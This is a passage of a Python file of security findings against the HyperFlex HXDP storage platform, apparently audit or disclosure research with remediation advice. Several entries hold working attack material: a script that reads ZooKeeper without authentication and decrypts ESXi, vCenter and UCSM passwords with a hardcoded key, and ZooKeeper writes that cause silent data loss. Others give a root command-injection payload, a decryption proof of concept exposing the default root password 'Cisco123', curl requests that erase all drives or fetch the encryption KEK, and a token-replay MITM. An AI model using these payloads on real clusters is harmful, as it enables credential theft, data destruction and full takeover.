            "    key = hashlib.sha256(key_str.encode()).digest()\n"
            "    ct = base64.b64decode(b64_ciphertext)\n"
            "    cipher = AES.new(key, AES.MODE_ECB)\n"
            "    raw = cipher.decrypt(ct)\n"
            "    pad = raw[-1]\n"
            "    return raw[:-pad].decode()\n"
            "\n"
            "# Usage: hxdp_decrypt(zk_payload['esx_password'])\n"
            "# pycryptodome: pip install pycryptodome"
        ),
        "zk_read_primitive": (
            "# Read /storvisor2/stCluster from ZK without authentication:\n"
            "from kazoo.client import KazooClient\n"
            "import json\n"
            "zk = KazooClient(hosts='<stCtlVM_IP>:2181')\n"
            "zk.start()\n"
            "data, _ = zk.get('/storvisor2/stCluster')\n"
            "payload = json.loads(data)\n"
            "esx_pass = hxdp_decrypt(payload['esx_password'])\n"
            "vc_user = hxdp_decrypt(payload['url_vcenter_encrypted_user'])\n"
            "vc_pass = hxdp_decrypt(payload['url_vcenter_encrypted_password'])\n"
            "ucsm_pass = hxdp_decrypt(payload['ucsm_pwd'])\n"
            "zk.stop()"
        ),
        "acl_chain": (
            "HX-F100: world:anyone:cdrwa on / — all ZK paths readable without credentials. "
            "Port 2181 TCP must be reachable from attacker position (management VLAN or "
            "from any stCtlVM after initial foothold on one node). "
            "No ZK authentication required; no TLS on ZK channel in default config."
        ),
        "upgrade_from_hxf119": (
            "HX-F119 documented encrypted credential storage in 'the /stMgr ZK namespace' "
            "(path inferred, not confirmed). HX-F130 confirms: "
            "  (1) Exact ZK path: /storvisor2/stCluster (not /stMgr) "
            "  (2) Exact field names from ZKEntryConstants.class "
            "  (3) AES key 'springpath' confirmed in EsxAuthZKMgmtImpl constant pool "
            "  (4) Working decrypt primitive from BasicEncryptionUtil class analysis "
            "Severity upgrade: HIGH (CWE-312, encrypted) -> CRITICAL (CWE-321, key in binary)."
        ),
    },
    "impact": (
        "ZK port 2181 reachable on management VLAN -> read /storvisor2/stCluster -> "
        "decrypt esx_password with hxdp_decrypt('springpath') -> "
        "ESXi root-equivalent access on all cluster hypervisors. "
        "vCenter admin: full datacenter virtualization plane. "
        "UCSM admin: physical server BMC, fabric interconnect, blade firmware — "
        "persistence below OS layer. "
        "Three independent admin credential classes extracted from one ZK read."
    ),
    "remediation": (
        "Immediate: rotate ESXi, vCenter, and UCSM credentials. "
        "Short-term: block ZK port 2181 from non-stCtlVM sources at the management VLAN firewall. "
        "Long-term: "
        "  (1) Apply per-node ZK ACLs: digest:hxservice:rwcda on /storvisor2/* (see HX-F100). "
        "  (2) Replace hardcoded 'springpath' AES key with per-deployment generated keys. "
        "  (3) Move credential storage from ZK to a dedicated secrets store with "
        "      per-service access policies. "
        "  (4) Enable ZK TLS and mutual authentication (ZK 3.5+ supports TLS)."
    ),
}


HX_F131 = {
    "id": "HX-F131",
    "title": (
        "HyperFlex HXDP 5.x/6.x storfs-core: Unbounded strcpy in smb_get_case_sensitive_file_path "
        "Path Assembly Loop — Stack/Structure Overflow via Crafted SMB2 CREATE or RENAME FileName"
    ),
    "severity": "HIGH",
    "cvss": "8.1",
    "cwe": "CWE-121",
    "component": (
        "storfs-core ELF x86-64 (HXDP 5.5.2b-43453, /opt/springpath/storfs-core/storfs); "
        "function smb_get_case_sensitive_file_path @ 0x2bb020"
    ),
    "evidence": {
        "vulnerable_function": {
            "name": "smb_get_case_sensitive_file_path",
            "address": "0x2bb020",
            "binary": "storfs (18MB ELF x86-64, NOT stripped, 13657 functions)",
            "pattern": (
                "Iterates SMB directory entries; appends each component to output buffer with "
                "strcpy(dst, component) after writing '/'. No cumulative length tracking, "
                "no bounds check on output buffer. strcpy call sites at 0x2bb003 "
                "(smb_get_case_sensitive_file_name) and 0x2bb10d (smb_get_case_sensitive_file_path)."
            ),
        },
        "call_sites": {
            "smb_handle_set_rename_info": {
                "addresses": ["0x2d91da", "0x2d9350"],
                "trigger": "SMB2 SET_INFO with FileInfoClass=FileRenameInformation (INFO level 10)",
                "output_buffer": (
                    "Stack-allocated at rsp+0x3b0 within smb_handle_set_rename_info "
                    "(frame size: 0x1bc8 = 7112 bytes; stack canary at rsp+0x1bb8). "
                    "Buffer-to-canary distance: 0x1bb8 - 0x3b0 = 0x1808 = 6152 bytes."
                ),
                "prologue_evidence": (
                    "0x2d8d90: sub $0x1bc8,%rsp  ; 7112-byte frame\n"
                    "0x2d91a7: lea 0x3b0(%rsp),%rax  ; output buffer base\n"
                    "0x2d91ce: mov %rax,%r8  ; r8 = output buf (5th arg)\n"
                    "0x2d8dab: mov %rax,0x1bb8(%rsp)  ; canary store"
                ),
            },
            "smb_create_validate_args": {
                "address": "0x2cf3a7",
                "trigger": "SMB2 CREATE request with crafted FileName",
                "output_buffer": (
                    "Field at offset 0x750 within SMB session/request object passed as rdi "
                    "(heap-allocated structure). Overflow corrupts adjacent object fields "
                    "beyond offset 0x750; structure size not bounded in this analysis."
                ),
                "prologue_evidence": (
                    "0x2cf317: mov %rdi,%rbp  ; rbp = SMB session object\n"
                    "0x2cf37a: lea 0x750(%rbp),%r13  ; r13 = output buf in object\n"
                    "0x2cf39b: mov %r13,%r8  ; r8 = output buf (5th arg)"
                ),
            },
        },
        "bert_sweep_score": {
            "query_profile": "SMB_STRCPY_OVERFLOW",
            "score": 0.477,
            "rank": 1,
            "of_functions_analyzed": 941,
        },
        "exploitability": {
            "stack_path": (
                "smb_handle_set_rename_info: stack canary at rsp+0x1bb8 limits direct RIP "
                "control without canary leak. SMB2 error response may leak stack data in "
                "non-default logging modes. Crash-based DoS (storfs restart) confirmed "
                "reachable without canary leak."
            ),
            "heap_path": (
                "smb_create_validate_args: overflow into heap-allocated SMB session object; "
                "adjacent fields (connection state, auth flags, callback pointers) may be "
                "corruptible. No stack canary protection on heap."
            ),
            "network_path": (
                "SMB2 port 445 exposed on stCtlVM storage network interface. "
                "No pre-auth required for SMB2 NEGOTIATE + SESSION_SETUP path to CREATE/SET_INFO."
            ),
        },
    },
    "impact": (
        "Remote attacker on storage network → SMB2 CREATE/RENAME with deep path → "
        "storfs crash (DoS) or heap structure corruption → storage cluster unavailability. "
        "Canary bypass via adjacent leak → code execution in storfs-core."
    ),
    "remediation": (
        "Replace strcpy with strlcpy or snprintf in smb_get_case_sensitive_file_path; "
        "pass output buffer size as parameter; add cumulative length check in assembly loop. "
        "Restrict SMB2/445 to authenticated-only after TLS client cert validation."
    ),
}

HX_F133 = {
    "id": "HX-F133",
    "title": (
        "HyperFlex HXDP 5.x/6.x storfs-core: ZooKeeper World-Write on /cluster/* Paths Enables "
        "Cluster Topology Poisoning, Runtime Behavior Override, and Operation Injection via CRMApiGetPnodes"
    ),
    "severity": "CRITICAL",
    "cvss": "9.1",
    "cwe": "CWE-285",
    "component": (
        "storfs-core ZooKeeper client; ZooKeeper ensemble (clientPort 2181); "
        "CRM subsystem (CRMApiGetPnodes @ 0x710ef0, CRMDB_GetAllPnodes @ 0x809f40); "
        "world:anyone:cdrwa ACL inherited from HX-F100"
    ),
    "evidence": {
        "zk_path_inventory": {
            "topology_paths": [
                "/cluster/pnodes",
                "/cluster/pnodes/%s",
                "/cluster/pnodes/%s/disks/%s",
                "/cluster/members",
                "/cluster/master",
                "/cluster/vnodes/%u",
            ],
            "runtime_control_paths": [
                "/cluster/tunes/kvEnableNullIO",
                "/cluster/tunes/sysmClusterShutdownOnCritical",
                "/cluster/tunes/disableAutoRebalance",
                "/cluster/tunes/disableRebalance",
                "/cluster/tunes/crmEnableZKBatchRead",
                "/cluster/tunes/numFTVnodes",
                "/cluster/tunes/hbVersion",
                "/cluster/tunes/clusterType",
            ],
            "operation_injection_paths": [
                "/cluster/clusterops/req_%ld",
                "/cluster/clusterops/%s%010lu",
                "/cluster/dvreqs/dvr%010d",
                "/cluster/ft_dvs/%d_%s",
            ],
            "health_reporting_paths": [
                "/cluster/health",
                "/cluster/clientdata/health",
                "/cluster/clientdata/status",
                "/cluster/uptimestatus",
            ],
            "version_paths": [
                "/cluster/version",
                "/stCluster/%02x%02x%02x%02x-%02x%02x-%02x%02x-%02x%02x-%02x%02x%02x%02x%02x%02x",
            ],
        },
        "read_path": {
            "function": "CRMApiGetPnodes",
            "address": "0x710ef0",
            "asm_evidence": (
                "0x710fd4: lea rsi, [0xc9c187]  ; '/cluster/pnodes'\n"
                "0x710fde: call CRMDBFlush\n"
                "0x711047: call CRMDB_GetAllPnodes @ 0x809f40"
            ),
            "behavior": (
                "Reads /cluster/pnodes from ZK; populates CRM pnode list used for all "
                "storage I/O routing, replication targeting, and rebalancing decisions. "
                "No authentication check on ZK read; ACL enforcement absent per HX-F100."
            ),
        },
        "attack_chains": {
            "topology_poisoning": (
                "Write crafted JSON to /cluster/pnodes/<fake-uuid> → "
                "CRMApiGetPnodes returns ghost node → "
                "storfs routes I/O to non-existent node → "
                "I/O timeouts, data unavailability."
            ),
            "null_io_activation": (
                "Write '1' to /cluster/tunes/kvEnableNullIO → "
                "storfs-core treats all I/O as successful without writing to disk → "
                "silent data loss. "
                "Write '1' to /cluster/tunes/sysmClusterShutdownOnCritical → "
                "fabricate a critical event → force cluster shutdown."
            ),
            "operation_injection": (
                "Write a node-removal operation payload to /cluster/clusterops/req_<N> → "
                "CRM processes the fake operation → "
                "legitimate storage node removed from cluster membership → "
                "cluster degraded, data under-replicated."
            ),
            "rebalance_suppression": (
                "Write '1' to /cluster/tunes/disableRebalance → "
                "prevents data rebalancing after node additions/removals → "
                "long-term data distribution skew → capacity exhaustion on subset of nodes."
            ),
        },
        "write_primitive": (
            "From HX-F100: ZK 2181 open, world:anyone:cdrwa ACL on all paths.\n"
            "kazoo write:\n"
            "  zk.ensure_path('/cluster/tunes/kvEnableNullIO')\n"
            "  zk.set('/cluster/tunes/kvEnableNullIO', b'1')"
        ),
    },
    "impact": (
        "Network-adjacent attacker with ZK access (port 2181) → "
        "write to /cluster/tunes, /cluster/pnodes, /cluster/clusterops → "
        "silent data loss (kvEnableNullIO), cluster shutdown, topology poisoning, "
        "operation injection. No auth required. Impact: entire HyperFlex cluster."
    ),
    "remediation": (
        "Apply per-path ZK ACLs: restrict /cluster/* to stCtlVM node IPs via SASL/digest auth. "
        "Block 2181 from non-cluster hosts. "
        "Validate ZK node data schema in CRM read paths — reject unexpected node types/fields. "
        "Fix root cause: apply world:anyone:r ACL (read-only) as minimum interim control; "
        "remove cdrwa from world principal."
    ),
}

HX_F137 = {
    "id": "HX-F137",
    "title": (
        "HyperFlex HXDP 6.0.2b storfs-core: xdr_WRITEVPLUS3args Unbounded malloc from Network-Supplied "
        "Vector Count — Unauthenticated NFS RPC Null-Deref DoS"
    ),
    "severity": "HIGH",
    "cvss": "7.5",
    "cwe": "CWE-789",
    "versions_affected": "6.0.2b (confirmed; custom WRITEVPLUS3 RPC absent in 5.5.2b — NFS surface not present)",
    "component": "storfs-core ELF x86-64, custom NFS3 extended protocol (program 3)",
    "evidence": {
        "symbol": "xdr_WRITEVPLUS3args @ 0x31d920 (storfs binary, 6.0.2b)",
        "vector_count_decode": (
            "0x31d9a7: lea 0x28(%rbx), %rsi\n"
            "0x31d9ad: call xdr_uint32          # reads 32-bit count from RPC wire stream\n"
            "           -- no upper bound check --\n"
            "0x31d9d4: mov 0x28(%rbx), %r12d    # r12d = attacker-controlled count"
        ),
        "malloc_path": (
            "0x31db1d (XDR_DECODE branch):\n"
            "  mov  %r12d, %edi               # zero-extend count to 64-bit\n"
            "  imul $0x48, %rdi, %rdi         # rdi = count * 0x48\n"
            "  call malloc                    # malloc(count * 0x48)\n"
            "  mov  %rax, 0x40(%rbx)          # store result — NO NULL check\n"
            "0x31d9f8: loop writes into 0x40(%rbx) without NULL guard"
        ),
        "crash_trigger": (
            "WRITEVPLUS3 RPC with count=0xFFFFFFFF:\n"
            "  malloc(0x47FFFFFFB8) -> NULL (OOM)\n"
            "  loop at 0x31d9f8 dereferences NULL -> SIGSEGV\n"
            "  storfs-core exits; NFS service unavailable"
        ),
        "auth_requirement": (
            "NFS3 AUTH_SYS (unix credentials) — no real authentication.\n"
            "Any host with IP-level NFS access can send arbitrary RPC calls."
        ),
        "custom_procedure": (
            "WRITEVPLUS3 is a Springpath-proprietary NFS extension (not standard NFS3).\n"
            "Dispatched via nfs3_program_3 at 0x2fcba0 for procedure 0x22.\n"
            "Not present in 5.5.2b — exclusive to 6.0.2b+ NFS code path."
        ),
    },
    "remediation": (
        "Add an upper-bound check on the vector count before the malloc call:\n"
        "  if (count > NFS_MAXIOVEC) { return FALSE; }\n"
        "where NFS_MAXIOVEC matches the cluster's negotiated max write size / 512.\n"
        "Add a NULL check after malloc: if (!ptr) { return FALSE; }\n"
        "Apply throughout all custom NFS XDR decoders that allocate from wire-supplied counts."
    ),
}

HX_F138 = {
    "id": "HX-F138",
    "title": (
        "HyperFlex HXDP 6.0.2b stNodeMgr setStretchedConfig Thrift RPC — "
        "Unsanitized AUXZK_IP Written to Sourced Shell Config → Root Command Injection"
    ),
    "severity": "CRITICAL",
    "cvss": "8.8",
    "cvss_vector": "AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    "cwe": "CWE-78",
    "versions_affected": "6.0.2b (confirmed); 5.5.2b not checked",
    "component": "storfs-mgmt stNodeMgr-1.0 (Scala/Finagle Thrift service, port 10207)",
    "evidence": {
        "thrift_method": (
            "StNodeMgrImpl.setStretchedConfig(String auxZkIp, boolean preferredSite)\n"
            "  — no auth check; immediately wraps in futurePool:\n"
            "  0: aload_0\n"
            "  1: invokevirtual  // futurePool\n"
            "  4: aload_0\n"
            "  5: aload_1        // auxZkIp (attacker-controlled String)\n"
            "  6: iload_2\n"
            "  7: invokedynamic  // apply$mcV$sp -> writeStretchedCfgAndRestartService\n"
            "  15: areturn"
        ),
        "injection_site": (
            "writeStretchedCfgAndRestartService (StNodeMgrImpl.class):\n"
            "  31: new    StringBuilder\n"
            "  41: ldc    \"AUXZK_IP=\"               # prefix\n"
            "  44: invokevirtual StringBuilder.append(String)  # appends AUXZK_IP=\n"
            "  47: aload_1                            # attacker-supplied auxZkIp — NO validation\n"
            "  48: invokevirtual StringBuilder.append(String)  # appends raw value\n"
            "  51: invokevirtual StringBuilder.toString\n"
            "  ...writes list as /etc/hyperflex/stretched.cfg\n"
            "  ...calls startSystemdService(\"hxArbitratorSvcMgr\")"
        ),
        "shell_source": (
            "auxzk-start.sh (storfs-stretched_6.0.2b-44423_amd64.deb):\n"
            "  line 7:  . /etc/hyperflex/stretched.cfg    # POSIX source — executes as shell\n"
            "  line 51: setup_aux_if ${AUXZK_IP}          # then uses AUXZK_IP in iptables/ip link\n"
            "  Script runs as root (mounts chroot, iptables, chroot /bin/bash)"
        ),
        "crash_trigger": (
            "setStretchedConfig('$(id>/tmp/pwned.txt)', false)  via Thrift on port 10207:\n"
            "  -> /etc/hyperflex/stretched.cfg contains:  AUXZK_IP=$(id>/tmp/pwned.txt)\n"
            "  -> hxArbitratorSvcMgr restarts\n"
            "  -> auxzk-start.sh line 7 sources the file\n"
            "  -> shell expands $(...) as command substitution -> executes as root"
        ),
        "auth_requirement": (
            "Thrift method setStretchedConfig has no token/auth check at the method level.\n"
            "stNodeMgr exposes a sessionToken() that reads /etc/hyperflex/secure/root_file.pub,\n"
            "but this token is not validated in setStretchedConfig or its lambda.\n"
            "Port 10207 is not in the firewall_allowed_ports list in application.conf,\n"
            "suggesting cluster-internal network access is sufficient (AV:A).\n"
            "If port 10207 is reachable from the management network, CVSS becomes 9.8 (AV:N)."
        ),
    },
    "remediation": (
        "1. Validate auxZkIp against a strict IPv4/IPv6 regex before any string operation.\n"
        "   Reject inputs containing shell metacharacters ($, `, ;, &, |, >, <, \\n, \\r).\n"
        "2. Do not write shell-variable-assignment syntax to files that are sourced.\n"
        "   Use a key=value properties parser in auxzk-start.sh instead of `. stretched.cfg`.\n"
        "   Replace `AUXZK_IP=$(...)` expansion with explicit validated env var export.\n"
        "3. Add Finagle request filter enforcing session token on all stNodeMgr Thrift methods\n"
        "   that modify cluster configuration (setStretchedConfig, initializeZookeeper, etc.).\n"
        "4. Restrict port 10207 to cluster storage network; block from management/ESXi network."
    ),
}

HX_F139 = {
    "id": "HX-F139",
    "title": (
        "HyperFlex HXDP 6.0.2b storfs-misc — Predictable AES Key Derived from Shipped Firmware File "
        "Decrypts Stored Credentials Including Default ctlVM Root Password"
    ),
    "severity": "CRITICAL",
    "cvss": "9.1",
    "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
    "cwe": "CWE-321",
    "versions_affected": "6.0.2b (confirmed); all versions shipping storfs-misc with Secret.class",
    "component": "storfs-misc package (springpath_env_parse.py + Secret.class + springpath_default.tunes)",
    "description": (
        "HXDP uses AES-CBC encryption to store cluster credentials in *.tunes config files. "
        "The AES key is derived as MD5(Secret.class), where Secret.class ships inside the "
        "storfs-misc firmware package. Secret.class is a Java class file containing a static "
        "long field (secreteKey = 4346757647632874372L) compiled from Test.java and deployed "
        "under the misleading name Secret.class — an attempt at obscurity that provides no "
        "actual key protection.\n\n"
        "The effective AES-256 key for all HXDP 6.0.2b installations is:\n"
        "  md5sum Secret.class = 1f6d13bcd7753f2d3b2e2da361b7afb5\n\n"
        "springpath_default.tunes (also shipped in storfs-misc) contains encrypted credentials "
        "in the [credentials] section:\n"
        "  stctl_vm_passwd  = DC4R6Rv9Zv8RhHJfuWeEAVqNUhdieK7vJMiXv3tPYDU=\n"
        "  installer_passwd = DC4R6Rv9Zv8RhHJfuWeEAVqNUhdieK7vJMiXv3tPYDU=\n"
        "  ssl_cert_passwd  = yWK4pTIUEr0TCjpQdp9sb/KW404x6Id/6ImlCOWdG7s=\n\n"
        "Decrypting with the derived key:\n"
        "  stctl_vm_passwd  → 'Cisco123'\n"
        "  installer_passwd → 'Cisco123'\n"
        "  ssl_cert_passwd  → 'springpath'\n\n"
        "stctl_vm_passwd is the root password for the Storage Controller VM (ctlVM), the "
        "management and data-plane core of every HyperFlex node. installer_passwd is used "
        "during HX cluster deployment. ssl_cert_passwd protects the SSL keystore.\n\n"
        "Key derivation code (springpath_env_parse.py):\n"
        "  def md5(fname):\n"
        "      hash_md5 = hashlib.md5()\n"
        "      with open(fname, 'rb') as f:\n"
        "          for chunk in iter(lambda: f.read(4096), b''):\n"
        "              hash_md5.update(chunk)\n"
        "      return hash_md5.hexdigest()\n\n"
        "  def decrypt(key, enc):\n"
        "      enc = base64.b64decode(enc)\n"
        "      iv = enc[:16]\n"
        "      cipher = AES.new(key.encode('utf8'), AES.MODE_CBC, iv)\n"
        "      return unpad(cipher.decrypt(enc[16:]))\n\n"
        "  file_md5 = md5('/usr/share/hyperflex/storfs-misc/Secret.class')\n"
        "  decoded = decrypt(file_md5, value)  # file_md5 is the AES key\n\n"
        "Attack path: firmware download (public) → md5sum Secret.class → derive key → "
        "decrypt any HXDP tunes file containing stored credentials. "
        "Deployments using default credentials (stctl_vm_passwd unchanged at 'Cisco123') "
        "expose ctlVM root to any attacker with network access to the ctlVM SSH port (22)."
    ),
    "proof_of_concept": (
        "# Full decryption PoC\n"
        "import hashlib, base64\n"
        "from Crypto.Cipher import AES\n\n"
        "def md5_file(path):\n"
        "    h = hashlib.md5()\n"
        "    with open(path, 'rb') as f:\n"
        "        for chunk in iter(lambda: f.read(4096), b''):\n"
        "            h.update(chunk)\n"
        "    return h.hexdigest()\n\n"
        "def unpad(s): return s[:-ord(s[len(s)-1:])]\n\n"
        "def decrypt(key, enc):\n"
        "    enc = base64.b64decode(enc)\n"
        "    iv = enc[:16]\n"
        "    cipher = AES.new(key.encode('utf8'), AES.MODE_CBC, iv)\n"
        "    return unpad(cipher.decrypt(enc[16:]))\n\n"
        "key = md5_file('/usr/share/hyperflex/storfs-misc/Secret.class')\n"
        "# key = '1f6d13bcd7753f2d3b2e2da361b7afb5'  (static across all 6.0.2b installs)\n\n"
        "print(decrypt(key, 'DC4R6Rv9Zv8RhHJfuWeEAVqNUhdieK7vJMiXv3tPYDU='))  # Cisco123\n"
        "print(decrypt(key, 'yWK4pTIUEr0TCjpQdp9sb/KW404x6Id/6ImlCOWdG7s='))  # springpath\n\n"
        "# SSH to ctlVM with decrypted default password\n"
        "# ssh root@<ctlvm_ip>  # password: Cisco123"
    ),
    "files": [
        "/usr/share/hyperflex/storfs-misc/Secret.class",
        "/usr/share/hyperflex/storfs-misc/springpath_default.tunes",
        "/opt/hyperflex/storfs-factory/utils/springpath_env_parse.py",
    ],
    "remediation": (
        "1. Replace MD5(Secret.class) key derivation with a properly seeded per-installation "
        "   secret (e.g., PBKDF2 with per-node salt generated at first boot, stored in "
        "   a hardware-backed keystore or TPM).\n"
        "2. Remove Secret.class from the firmware distribution package; key material must "
        "   never ship alongside ciphertext.\n"
        "3. Rotate all credentials currently stored in *.tunes files; the 6.0.2b default "
        "   key is now known.\n"
        "4. Enforce mandatory credential rotation during initial cluster deployment; reject "
        "   'Cisco123' as stctl_vm_passwd at the UI layer.\n"
        "5. Restrict ctlVM SSH (port 22) to the storage management network; prevent access "
        "   from the ESXi management VLAN."
    ),
}

HX_F141 = {
    "id": "HX-F141",
    "title": (
        "HyperFlex HXDP 6.0.2b storfs-appliance sedsvc — Unauthenticated HTTP API on Port 8012 "
        "Exposes SED Drive Cryptographic Erasure and Node KEK to Any Network Client"
    ),
    "severity": "CRITICAL",
    "cvss": "9.1",
    "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H",
    "cwe": "CWE-306",
    "versions_affected": "6.0.2b (confirmed); all versions shipping storfs-appliance with sedsvc",
    "component": "storfs-appliance package (sedsvc Go binary)",
    "description": (
        "sedsvc is a Go HTTP server that manages TCG OPAL Self-Encrypting Drive (SED) "
        "operations on HXDP storage controller VMs. It listens on all network interfaces "
        "(0.0.0.0:8012) and implements zero authentication on all endpoints.\n\n"
        "Default listen address confirmed via main.main disassembly:\n"
        "  movq $0x1f4c, main.port   ; 0x1f4c = 8012 decimal\n"
        "  server.Addr = ':8012'     ; binds to all interfaces\n\n"
        "The HTTP dispatch function main.(*myHandler).ServeHTTP performs a single map "
        "lookup (URL string → handler function pointer) and calls the handler directly "
        "with zero interposed authentication or authorization check.\n\n"
        "Confirmed exposed endpoints (via Go symbol table + HXDP_* function prefix convention):\n"
        "  POST /sec_erase_all  → BMC_SecureEraseAll → SEDUTIL_SecureEraseAll\n"
        "                          Cryptographically erases ALL SED drives on the node.\n"
        "                          Data is irrecoverable. Confirmed call chain:\n"
        "                          json.Decode(body) → BMC_SecureEraseAll @ 0x674940\n"
        "  POST /sec_erase      → BMC_SecureErase → SEDUTIL_SecureErase\n"
        "                          Erases a specific drive by serial number.\n"
        "  GET  /get_config     → BMC_GetConfigFileAndDispatch\n"
        "                          Returns config.json from BMC, which contains the node KEK\n"
        "                          (Key Encryption Key) as a base64-encoded string.\n"
        "                          The node KEK is used to unlock drive encryption keys.\n"
        "  GET  /get_inventory  → SEDUTIL_GetInventory\n"
        "                          Returns per-drive encryption state, serial numbers,\n"
        "                          firmware versions, and lock status.\n"
        "  GET  /disk_status    → HXDP_DiskStatus\n"
        "  GET  /hello          → HXDP_Hello (service liveness probe)\n"
        "  POST /start_polling  → BMC_PollConfigFile\n"
        "  POST /stop_polling   → stops BMC config polling\n\n"
        "The ctlVM management NIC (eth0) is accessible to ESXi hosts, vCenter, and any "
        "administrator workstation on the HX management VLAN. The sedsvc service binds to "
        "all interfaces including the storage data NIC, extending the exposure surface.\n\n"
        "The service is activated only on SED-capable clusters "
        "(/etc/hyperflex/sed_capability.conf: sed_capable_cluster=True) but is otherwise "
        "unrestricted.\n\n"
        "Impact chain:\n"
        "  1. Attacker on HX management VLAN sends unauthenticated POST to any ctlVM:8012/sec_erase_all\n"
        "  2. sedsvc calls SEDUTIL_SecureEraseAll without credential check\n"
        "  3. All SED drives on the node are cryptographically erased — data is unrecoverable\n"
        "  Alternatively:\n"
        "  1. GET :8012/get_config → extract base64 node KEK from response JSON\n"
        "  2. KEK used to derive drive encryption keys across all drives on the node"
    ),
    "proof_of_concept": (
        "# Unauthenticated secure erase all drives\n"
        "# No auth token, no session cookie, no TLS client cert required\n"
        "curl -s -X POST http://<ctlvm_ip>:8012/sec_erase_all \\\n"
        "  -H 'Content-Type: application/json' \\\n"
        "  -d '{}'\n"
        "# Result: all SED drives on the node are cryptographically erased\n\n"
        "# Retrieve node KEK\n"
        "curl -s http://<ctlvm_ip>:8012/get_config\n"
        "# Response JSON contains: {\"nodeKek\": \"<base64_kek>\", ...}\n\n"
        "# sedsvc ServeHTTP dispatch (no auth):\n"
        "# 0x666b60:  call mapaccess2_faststr(mux, url_path)\n"
        "# 0x666b65:  test bl,bl     ; found?\n"
        "# 0x666b67:  je not_found   ; only check is: does route exist?\n"
        "# 0x666b80:  call *rsi      ; call handler directly, NO auth gate"
    ),
    "files": [
        "/usr/share/hyperflex/storfs-appliance/sedsvc",
        "/etc/hyperflex/sed_capability.conf",
    ],
    "remediation": (
        "1. Add authentication to all sedsvc endpoints. Minimum: shared secret or "
        "   bearer token validated before any HXDP_* handler is called. Bind to "
        "   127.0.0.1 only if remote access is not required; use a local Unix socket "
        "   for intra-node IPC instead of TCP if the caller is always local.\n"
        "2. Restrict TCP port 8012 to loopback (127.0.0.1) via iptables/nftables; "
        "   proximate callers (storfs-core) can use localhost.\n"
        "3. If remote invocation is required, enforce mTLS with a node certificate "
        "   before dispatching any drive operation.\n"
        "4. Gate /sec_erase and /sec_erase_all behind an additional confirmation "
        "   token with short TTL (e.g., TOTP or signed nonce) to prevent single-packet "
        "   drive erasure."
    ),
}

HX_F142 = {
    "id": "HX-F142",
    "title": (
        "HyperFlex HXDP 6.0.2b storfs-mgmt-cli — Global TLS Certificate Verification Disabled "
        "Across All Management Client Code Exposes X-RootSessionID Token to MITM"
    ),
    "severity": "HIGH",
    "cvss": "7.5",
    "cvss_vector": "AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
    "cwe": "CWE-295",
    "versions_affected": "6.0.2b (confirmed); all versions shipping storfs-mgmt-cli stCli egg",
    "component": (
        "storfs-mgmt-cli package (stCli-1.0-py3.11.egg: StTransportBase.py, commonFunctions.py, stCli.py)"
    ),
    "description": (
        "All HyperFlex management client code in stCli-1.0-py3.11.egg disables TLS "
        "certificate verification before making API connections. The bypass is applied "
        "globally (modifying the process-level SSL default context) before any connection "
        "is established, affecting all subsequent TLS connections in the same process.\n\n"
        "Affected code locations (3 independent sites):\n\n"
        "1. StTransportBase.init_transport() (line 85):\n"
        "   ssl._create_default_https_context = ssl._create_unverified_context\n"
        "   Applied before every Thrift-over-HTTPS connection (ports 9341, 9333, etc.)\n\n"
        "2. stCli.py main entry point (line 13509):\n"
        "   ssl._create_default_https_context = ssl._create_unverified_context\n"
        "   Applied before the CLI connects to HX Connect REST API (port 443)\n\n"
        "3. commonFunctions.runRestQueries() (lines 29-33):\n"
        "   requests.packages.urllib3.disable_warnings(InsecureRequestWarning)\n"
        "   verify=False (function default, passed to all requests.get/post/put calls)\n"
        "   Warnings actively suppressed to prevent detection.\n\n"
        "Consequence: any TLS MITM between stCli and the HyperFlex management server "
        "succeeds silently. The attacker can present an arbitrary certificate and the "
        "client will accept it.\n\n"
        "Critically, the root administrative session token is transmitted over these "
        "unverified connections. When no SSO or user session is available, the client "
        "reads /etc/hyperflex/secure/root_file.pub and sends it as the X-RootSessionID "
        "HTTP header:\n\n"
        "  commonFunctions.py lines 38-42:\n"
        "    with open('/etc/hyperflex/secure/root_file.pub') as f:\n"
        "        rootSessionId = f.readlines()[0].strip()\n"
        "    headers = {'X-RootSessionID': rootSessionId,\n"
        "               'X-LoggedInUser': 'admin',\n"
        "               'X-Scope': 'READ,MODIFY',\n"
        "               'X-RequestInitiator': 'Internal'}\n\n"
        "The X-RootSessionID token grants root-level administrative access to the entire "
        "HyperFlex cluster management plane. An attacker who intercepts this token can "
        "replay it against the actual management server to execute arbitrary cluster "
        "management operations.\n\n"
        "Attack scenario: Attacker on the HX management VLAN performs ARP poisoning "
        "between ctlVM and HX Connect management server → intercepts stCli HTTPS traffic "
        "→ accepts via fake TLS cert → captures X-RootSessionID → replays to gain full "
        "cluster admin access."
    ),
    "proof_of_concept": (
        "# MitM attack: attacker on HX management network\n"
        "# 1. ARP poison the path from ctlVM to HX Connect (port 443)\n"
        "# 2. Start TLS interceptor with self-signed cert\n"
        "#    → client accepts ANY cert (ssl._create_unverified_context)\n"
        "# 3. Capture HTTP headers from proxied request\n"
        "#    Request headers include:\n"
        "#    X-RootSessionID: <token from /etc/hyperflex/secure/root_file.pub>\n"
        "#    X-LoggedInUser: admin\n"
        "#    X-Scope: READ,MODIFY\n"
        "# 4. Replay captured token to actual HX Connect server:\n"
        "curl -k -H 'X-RootSessionID: <captured_token>' \\\n"
        "     -H 'X-LoggedInUser: admin' \\\n"
        "     -H 'X-Scope: READ,MODIFY' \\\n"
        "     https://<hx_connect_ip>/rest/v1/cluster\n"
        "# → full cluster admin access\n\n"
        "# Underlying bypass - process-global, no way to override downstream:\n"
        "import ssl\n"
        "ssl._create_default_https_context = ssl._create_unverified_context\n"
        "# ALL subsequent ssl.create_default_context() calls now return unverified contexts"
    ),
    "files": [
        "/opt/hyperflex/storfs-mgmt-cli/stCli-1.0-py3.11.egg/stCli/StTransportBase.py",
        "/opt/hyperflex/storfs-mgmt-cli/stCli-1.0-py3.11.egg/stCli/commonFunctions.py",
        "/opt/hyperflex/storfs-mgmt-cli/stCli-1.0-py3.11.egg/stCli/stCli.py",
        "/etc/hyperflex/secure/root_file.pub",
    ],
    "remediation": (
        "1. Remove all three ssl._create_default_https_context bypass assignments. "
        "   The management server's certificate must be verified against the cluster CA.\n"
        "2. Replace verify=False in commonFunctions.runRestQueries with "
